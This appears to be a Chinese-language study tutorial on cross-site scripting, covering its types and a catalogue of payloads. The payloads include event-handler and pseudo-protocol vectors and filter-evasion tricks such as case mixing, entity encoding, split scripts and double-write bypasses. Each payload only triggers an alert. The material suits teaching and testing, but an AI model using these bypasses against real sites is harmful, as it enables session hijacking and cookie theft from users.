# XSS漏洞概述

## 简介

XSS作为OWASP TOP 10之一

XSS被作为跨站脚本攻击(Cross-site scripting),本来应该缩写为CSS，但是由于和CSS(Cascading Style Sheets,层叠样式脚本)重名，所以更名为XSS。XSS（跨站脚本攻击）主要基于javascript(JS)完成恶意的攻击行为。JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。

XSS通过将精心构造的代码(JS)代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击的效果。当用户访问被XSS脚本注入的网页，XSS脚本就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意。也就是说，XSS的对象是用户和浏览器。

XSS漏洞发生在哪里？
服务器

微博、留言板、聊天室等等收集用户输入的地方，都有可能被注入XSS代码，都存在遭受XSS的风险，只要没有对用户的输入进行严格过滤，就会被XSS。

- XSS危害

  XSS利用JS代码实现攻击，有很多种攻击方式，一下简单罗列几种
  @ 盗取各种用户账号
  @ 窃取用户Cookie资料，冒充用户身份进入网站
  @ 劫持用户会话，执行任意操作
  @ 刷流量、执行弹窗广告
  @ 传播蠕虫病毒
  等等

- 漏洞的验证

  我们可以用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做PoX(Proof of Concept)。
  PoC 漏洞的验证与检测
  EXP 漏洞的完整利用
  shellcode  利用漏洞时，所执行的代码
  payload    攻击载荷
            sqlmap    攻击代码的模板
            msf       shellcode 类似，功能是建立与目标的连接 
  验证XSS漏洞存在的PoC如下
```
<script>alert(/xss/)</script>   常用
<script>confirm('xss')</script>
<script>prompt('xss')</script>
```

我们可以在测试页面中提交这样的代码[<script>alert(/xss/)</script>]

我们发现，提交的代码[<script>alert(/xss/)</script>],被当作字符串输出在HTML页面中，浏览器会根据[<script>]标签识别为JS语句，并会执行它，执行弹窗操作。也可以说，可以执行其他JS代码，因此我们验证了漏洞的存在性

## XSS的分类

XSS漏洞大概可以分为三个类型：反射型XSS、存储型XSS、DOM型XSS。

- 反射型XSS

反射型XSS是非持久性、参数型的跨站脚本。反射型XSS的JS代码在Web应用的参数（变量）中，如搜索框的反射型XSS。

在搜索框中，提交PoC[<script>alert(/xss/)</script>],点击搜索，即可触发反射型XSS。

注意到，我们提交的poc，会出现在search.php页面的keywords参数中。

- 存储型XSS

存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。

存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。

此时，我们只是完成了第一步，将恶意代码写入数据库。因为XSS使用的JS代码，JS代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的XSS代码，才能真正触发XSS。此时，需要我们模拟网站后台管理员的身份，查看留言。

- DOM XSS

DOM XSS比较特殊。owasp关于DOM型号XSS的定义是基于DOM的XSS是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM XSS比较难以检测。如下面例子
[#message=<script>alert(/xss/)</script>]

我们以锚点的方式提交PoC。PoC并不会发送到服务器，但是已经触发了XSS。查看当前页面的源代码如下

## XSS的构造
- 利用[<>]构造HTML/JS
可以利用[<>]构造HTML标签和<script>标签
在测试页面提交参数[<h1 style='color:red'>利用[<>]构造HTML/JS</h1>]

提交[<script>alert(/xss/)</script>]

- 伪协议

也可以使用javascript:伪协议的方式构造XSS
[javascript:alert(/xss/);]
提交参数[<a href="javascript:alert(/xss/)">touch me!</a>],然后点击超链接，即可触发XSS

也可以使用img标签的伪协议，但是这种方法在IE6下测试成功。[<img src="javascript:alert('xss')">]

- 产生自己的事件

“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS可以对这些事件进行响应。所以我们可以通过事件触发JS函数，触发XSS。

事件种类
windows事件            对windows对象触发的事件
Form事件               HTML表单内的动作触发事件
keyboard事件           键盘按键
Mouse事件              由鼠标或类似用户动作触发的事件
Media事件              由多媒体触发的事件

如，[<img src='./smile.jpg' onmouseover='alert(/xss/)'>]这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS代码。

单行文本框的键盘点击事件，[<input type="text" onkeydown="alert(/xss/)">],当点击键盘任意一个按键的时候出发。
<input type="text" onkeyup="alert(/xss/)">
<input type="button" onclick="alert(/xss/)">
[<img src='#' onerror='alert(/xss/)'>]

- 利用CSS跨站（old）

我们也可以利用CSS（层叠样式表）触发XSS。但是这种方法比较古老，基本上不适合现在主流的浏览器，但是从学习的角度，我们需要了解这种类型的XSS，以下代码均在IE6下测试

@ 行内样式
[<div style="background-image:url(javascript:alert(/xss/))">]

@ 页内样式
[<style>Body{background-image:url(javascript:alert(/xss/))}</style>]

@ 外部样式
[<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>]

- 其他标签以及手法(H5)
我们可以用其他标签触发XSS
[<svg onload="alert(/xss/)">] 这个语句还是比较简洁的

[<input onfocus=alert(/xss/) autofocus>]

## XSS的变形

我们可以构造XSS代码进行各种变形，以绕过XSS过滤器的检测。变形方式主要有以下几种

- 大小写转换

可以将payload进行大小写转换。如下面两个例子。
<Img sRc='#' Onerror="alert(/xss/)">

<a hREf="javaScript:alert(/xss/)">click me</a>

- 引号的使用

HTML语言中对引号的使用不敏感，但是某些过滤函数是“锱铢必较”。
<img src="#" onerror="alert(/xss/)"/>

<img src='#' onerror='alert(/xss/)'/>

<img src=# onerror=alert(/xss/)/>

- [/]代替空格

可以利用左斜线代替空格
<Img/sRc='#'/Onerror='alert(/xss/)'/>

- 回车

我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。
<Img/sRc='#'/Onerror  ='alert(/xss/)' />

<A hREf="j
a vascript:alert(/xss/)">click me!</a>

- 对标签属性值进行转码

可以对标签属性值进行转码，用来绕过过滤。对应编码如下

字母     ASCII码       十进制编码        十六进制编码
a        97            &#97;             &#x61;
e        101           &#101;            &#x65;

经过简单编码之后的样子
<a hREf="j&#97;v&#x61;script:alert(/xss/)">click me!</a>

另外，我们可以将以下字符插入到任意位置
Tab      &#9
换行     &#10
回车     &#13

可以将以下字符插入到头部位置
SOH     &#01
STX     &#02

经过编码后的样子
<A hREf="&#01;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:alert(/xss/)">
click me!
</a>

- 拆分跨站

<script>z='alert'</script>
<script>z=z+'(/xss/)'</script>
<script>eval(z)</script>

- 双写绕过

```
<script>
<scr<script>ipt>
```

- CSS中的变形

@ 使用全角字符
width:e x p r e s s i o n(alert(/xss/))

@ 注释会被浏览器忽略
width:expr/*~*/ession(alert(/x~s~s/))

@ 样式表中的[\]和[\0]
<style>@import 'javasc\ri\0pt:alert("xss")';</style>

Shellcode的使用
  Shellcode就是在利用漏洞所执行的代码
  完整的XSS攻击，会将Shellcode存放在一定的地方，然后触发漏洞。调用Shellcode。

- 远程调用JS

可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如[<script src="http://127.0.0.1/XSS-TEST/normal/xss.js"></script>]，这是比较常用的方式。XSS。js的内容如下：
```
alert('xss.js');
```

- windows.location.hash

